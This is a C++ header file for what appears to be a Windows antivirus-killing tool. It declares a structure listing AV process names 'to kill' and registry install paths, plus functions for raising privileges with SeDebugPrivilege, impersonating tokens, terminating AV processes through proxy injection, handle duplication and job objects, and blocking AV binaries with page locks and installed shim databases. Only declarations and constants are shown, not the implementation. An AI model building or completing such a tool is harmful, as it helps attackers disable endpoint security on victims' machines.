#ifndef MAINHEADER_H
#define MAINHEADER_H

#include <stdio.h>
#include <tchar.h>
#include <fstream>
#include <string>
#include <vector>
#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include "ntdll.h"
#include "AppHelpDef.h"
#pragma comment(lib, "ntdll.lib")

template <int N> struct AV_struct 
{
	//Count of processes to kill
    static const int process_name_count = N;
	//General name of AV
	std::string name_av;
	//Array of the processes names to kill
	std::wstring process_name[N];
	//AV-Reg information path
	std::wstring reg_path_install;
	std::wstring reg_path_install_subkey;
	//using wow64 registry path or not
	bool wow64_reg;
	//killing type
	int method_type;
};

///////Func def
//*//Main//*//
void PrintHelp(void);
///////////////
//*//Utils//*//
unsigned int EnumProc (std::wstring process_name,std::vector <unsigned int> &array_PID);
int  AdjustPriv		  (unsigned int priv_);
BOOL IsUserAdmin	  (void);
void MainPrivUtil	  (void);
NTSTATUS Query_TokenInfo (LPVOID *buffer_,HANDLE token_handle,
						  TOKEN_INFORMATION_CLASS token_inf_class);
bool CheckToken_group	 (PTOKEN_PRIMARY_GROUP tn_group);
NTSTATUS Query_Procsinfo (LPVOID *buffer_,SYSTEM_INFORMATION_CLASS sys_inf_class);
bool Impersonate_ThreadToken (PCLIENT_ID clientId_str);
bool Impersonate_Main (void);
bool  GetAVpath(std::wstring av_reg_path,std::wstring av_reg_path_subkey,std::wstring &install_path,bool wow_64);
PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName);
bool IsWow64();

///////////////
//*//Memory//*//
HANDLE Heap_init (void);
void Heap_Destroy (void);
///////////////
//*//RunTimeKill//*//
bool ProxyInjectAttack (std::wstring av_image_path,std::wstring proc_name);
bool DebugProxyInject(std::wstring av_image_path,std::wstring proc_name);
bool ProxyInjectSecond(std::wstring av_image_path,std::wstring proc_name);
int get_entrypoint(char *read_proc);
int get_size_of_image (char *read_proc);
BOOL DupHandleAttack (unsigned int pid_);
bool JobTerm (HANDLE full_acc_handle);
///////////////
//*//LockStuff//*//
bool PageLock (std::wstring av_image_path);
bool ShimEngineLock (void);
bool WrapInstallDb(std::wstring sdb_base_path);
bool InstallDbProc(std::wstring sdb_base_path,HKEY hkeyPath1,LPCTSTR subkeyPath1,LPCTSTR subkeyPath2);
bool RegInstall(HKEY key,LPCTSTR name,LPCTSTR guid,LPFILETIME fileTime);
///////////////
//Other def
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#define ADJUST_FAILED				  0x0
#define ADJUST_OK				      0x1
#define ADJUST_FAILED_LINKED_TOKEN    0x2
#define HEAP_SIZE					  8048
#define sub_count						1
#define CURRENT_THREAD				   -2
#define DUPLICATE_SAME_ATTRIBUTES	  0x00000004
#define DUPHANDLE_ATTACK              0x0
#define PROXYINJECT_ATTACK_1		  0x1
#define PROXYINJECT_ATTACK_2		  0x2
#define SeDebugPrivilege              0x14
#define SeCreatePagefilePrivilege     0xf

///

#endif